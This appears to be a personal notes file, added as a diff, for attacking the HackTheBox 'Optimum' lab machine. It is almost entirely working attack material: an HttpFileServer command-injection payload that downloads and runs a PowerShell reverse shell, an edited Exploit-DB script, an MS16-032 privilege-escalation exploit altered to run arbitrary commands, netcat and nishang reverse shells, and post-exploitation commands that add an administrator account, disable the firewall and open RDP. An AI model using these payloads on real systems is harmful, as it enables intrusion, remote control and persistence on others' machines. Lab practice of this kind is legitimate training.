@@ -1,0 +1,97 @@
+https://medium.com/@iammainul/hackthebox-optimum-walkthrough-powershell-only-21e17a8d29b3
+
+GET /?search=%00{.exec|ping+10.10.14.4.} HTTP/1.1
+
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.4 -Port 9001
+
+GET /?search=%00{.exec|C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.Webclient).downloadString('http://10.10.14.4/Invoke-PowerShellTcp.ps1').}
+
+
+
+GET /?search=%00{.exec|C%3a\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe+IEX(New-Object+Net.Webclient).downloadString('http%3a//10.10.14.4/Invoke-PowerShellTcp.ps1').} HTTP/1.1
+
+IEX(New-Object Net.Webclient).downloadString('http://10.10.14.4/Sherlock.ps1')
+
+----------
+KEVIN'S WAY
+
+GET INTO SYSTEM AS NORMAL USER
+./nmapAutomator.sh 10.10.10.8 All
+https://www.exploit-db.com/raw/39161
+
+vim 39161.py
+ip_addr = "10.10.14.9" #local IP address
+local_port = "6789" # Local Port number
+
+python -m SimpleHTTPServer 80
+nc -nlvp 6789
+python 39161.py 10.10.10.8 80
+
+CHECK FOR POE
+systeminfo
+./win-exp-suggester/windows-exploit-suggester.py --update
+./win-exp-suggester/windows-exploit-suggester.py --database 2020-04-05-mssb.xls --systeminfo win7sp1-systeminfo.txt
+
+https://www.exploit-db.com/exploits/39719
+
+TRY TO USE MS16-032 FOR POE IN POWERSHELL 64 BIT
+Add Invoke-MS16-032 at the end of 39719.ps1
+
+Run using powershell 64 bit
+%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9/39719-kevin.ps1')"
+
+MODIFY 39719.PS1 TO RUN REMOTE CMD
+At the top
+        [CmdletBinding()]
+        param (
+                [Parameter(Mandatory = $True)] [string]$Cmd
+        )
+
+In the middle
+               # LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED
+                $CallResult = [Advapi32]::CreateProcessWithLogonW(
+                        "user", "domain", "pass",
+                        0x00000002, "C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe", " -command $Cmd",
+                        0x00000004, $null, $GetCurrentPath,
+                        [ref]$StartupInfo, [ref]$ProcessInfo)
+
+At the end
+Invoke-MS16-032 -Cmd "C:\Users\kostas\Desktop\nc.exe -nv 10.10.14.9 6666 -e cmd.exe"
+
+Or use Powershell (nishang) reverse shell
+Invoke-MS16-032 -Cmd "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.9/nishang/Shells/Invoke-PowerShellTcp-kevin.ps1')"
+(Added at the end of Invoke-PowerShellTcp-kevin.ps1) Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.9 -Port 8888
+
+DOWNLOAD NC TO VICTIM
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.9/nc.exe', 'C:\Users\kostas\Desktop\nc.exe')
+
+RUN NC AS SYSTEM FOR REVERSE SHELL
+Normal nc reverse shell
+nc -nvlp 6666
+%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9/39719-kevin.ps1')"
+
+From PS reverse shell
+nc-nvlp 8888
+%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9/39719-kevin.ps1')"
+
+FINAL GETTING ADMIN
+In SYSTEM cmd
+net user newuser Password123 /add
+net localgroup administrators newuser /add
+
+netsh advfirewall set allprofiles state off
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
+rdesktop 10.10.10.8
+
+
+
+REFERENCES
+https://spencerdodd.github.io/2017/07/20/WOW64/
+https://help.appveyor.com/discussions/problems/3281-rdesktop-on-linux-requires-credssp
+https://warroom.rsmus.com/leveraging-ms16-032-powershell-empire/
+https://www.dell.com/support/article/en-vn/sln156432/windows-server-how-to-properly-turn-off-the-windows-firewall-in-windows-server-2008-and-above?lang=en
+https://www.exploit-db.com/exploits/39719
+https://www.exploit-db.com/exploits/39574
+https://github.com/lethanhtung01011980/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1
+https://medium.com/@iammainul/hackthebox-optimum-walkthrough-powershell-only-21e17a8d29b3
